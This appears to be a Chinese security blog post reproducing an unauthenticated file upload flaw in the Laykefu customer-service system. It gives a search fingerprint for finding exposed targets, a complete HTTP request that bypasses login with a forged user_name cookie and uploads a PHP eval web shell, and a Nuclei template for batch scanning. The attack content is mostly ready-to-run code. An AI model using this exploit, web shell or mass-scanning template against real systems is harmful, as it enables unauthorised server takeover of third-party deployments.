#  Laykefu客服系统任意文件上传漏洞复现(附POC)   
 AI与网安   2024-03-07 07:01  
  
![](https://mmbiz.qpic.cn/mmbiz_png/dMkBHvNs4ZelnIibDiaFwmQxEkzPTeSovoiaaOgyKCCiaCQIdmlskwOx7AFF1wmxW2B3u95Xw6Muy0VFia0h0vX5QlA/640 "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/EGDswCzPiapLhSKLRibPAiacIHvjzchkNYicRwf2yc19f6s6kRcYG1fN6R71Gmh9u1Y8E2BL3m91WNWZeVmQyRXn2g/640 "")  
  
part.01  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1BUAIdQuefEkfZDRX2QVjqheqhMYibApcN5QrdiagJUUWZuVdQ7mNribPeoo1nmlQ1Y1LXLicicl13X3QNCh7yawnEw/640 "")  
  
漏洞简介  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bfCPUAdmqXt9azsVkkRy7Cxeu2lghcl7kOzgbXqxg8kvYRqYg8PooGYj5qv8k7FYV4q6Wud7z8dlJjHtLPlrpQ/640 "")  
  
  
  
    Laykefu客服系统  
/admin/users/upavatar.html接口处存在文件上传漏洞，而且当请求中Cookie中的”user_name“不为空时即可绕过登录系统后台，未经身份验证的攻击者可利用此问题，上传后门文件，获取服务器权限。  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/EGDswCzPiapLhSKLRibPAiacIHvjzchkNYicRwf2yc19f6s6kRcYG1fN6R71Gmh9u1Y8E2BL3m91WNWZeVmQyRXn2g/640 "")  
  
part.02  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1BUAIdQuefEkfZDRX2QVjqheqhMYibApcN5QrdiagJUUWZuVdQ7mNribPeoo1nmlQ1Y1LXLicicl13X3QNCh7yawnEw/640 "")  
  
漏洞复现  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bfCPUAdmqXt9azsVkkRy7Cxeu2lghcl7kOzgbXqxg8kvYRqYg8PooGYj5qv8k7FYV4q6Wud7z8dlJjHtLPlrpQ/640 "")  
  
  
  
  
  
  
  
  
步骤一：使用以下搜索语法获取测试资产并确定测试目标~~~  
```
# 搜索语法
icon_hash="-334624619"

```  
  
  
步骤二：开启代理抓取数据包并修改进行文件上传测试，Success!  
```
POST /admin/users/upavatar.html HTTP/1.1
Host: 127.0.0.1
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.26
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3OCVBiwBVsNuB2kR
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: user_name=1; user_id=3
Connection: close
 
------WebKitFormBoundary3OCVBiwBVsNuB2kR
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: image/png
 
<?php phpinfo();@eval($_POST['sec']);?>
------WebKitFormBoundary3OCVBiwBVsNuB2kR--
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/dMkBHvNs4ZelnIibDiaFwmQxEkzPTeSovogI1raXYAbbddKJHZB355sP4TK6zs8sNxx7NeGe9hW8yxz9BBztRXPA/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/EGDswCzPiapLhSKLRibPAiacIHvjzchkNYicRwf2yc19f6s6kRcYG1fN6R71Gmh9u1Y8E2BL3m91WNWZeVmQyRXn2g/640 "")  
  
part.03  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1BUAIdQuefEkfZDRX2QVjqheqhMYibApcN5QrdiagJUUWZuVdQ7mNribPeoo1nmlQ1Y1LXLicicl13X3QNCh7yawnEw/640 "")  
  
批量脚本  
  
![](https://mmbiz.qpic.cn/mmbiz_png/bfCPUAdmqXt9azsVkkRy7Cxeu2lghcl7kOzgbXqxg8kvYRqYg8PooGYj5qv8k7FYV4q6Wud7z8dlJjHtLPlrpQ/640 "")  
  
```
id: Laykefu-Upload

info:
  name: Laykefu-Upload
  author: lanyue
  severity: high
  description: Laykefu-Upload-GetShell
  reference:
  - https://github.com/
  - https://cve.mitre.org/
  metadata:
    max-request: 1
    shodan-query: ""
    verified: true

http:
- method: POST
  path:
  - '{{RootURL}}/admin/users/upavatar.html'
  headers:
    Accept: application/json, text/javascript, */*; q=0.01
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3OCVBiwBVsNuB2kR
    Cookie: user_name=1; user_id=3
    User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML,
      like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.26
    X-Requested-With: XMLHttpRequest
  body: "------WebKitFormBoundary3OCVBiwBVsNuB2kR\r\nContent-Disposition: form-data;
    name=\"file\"; filename=\"1.php\"\r\nContent-Type: image/png\r\n \r\n<?php phpinfo();?>\r\n------WebKitFormBoundary3OCVBiwBVsNuB2kR--"

  max-redirects: 3
  matchers-condition: and
  matchers:
  - type: regex
    part: body
    regex:
    - .{30,}.php

  - type: status
    part: body
    status:
    - "200"
```  
  
  
  
